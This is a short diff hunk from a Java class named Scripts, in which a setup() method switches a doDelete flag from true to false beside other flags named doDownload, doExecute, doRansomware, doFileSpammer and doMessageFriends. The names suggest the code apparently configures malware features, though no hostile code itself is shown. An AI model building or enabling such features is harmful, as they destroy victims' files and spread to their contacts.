@@ -37,7 +37,7 @@ public class Scripts {
 	public void setup() {
 		doDownload = false;
 		doExecute = false;
-		doDelete = true;
+		doDelete = false;
 		doRansomware = false;
 		doFileSpammer = false;
 		doMessageFriends = false;
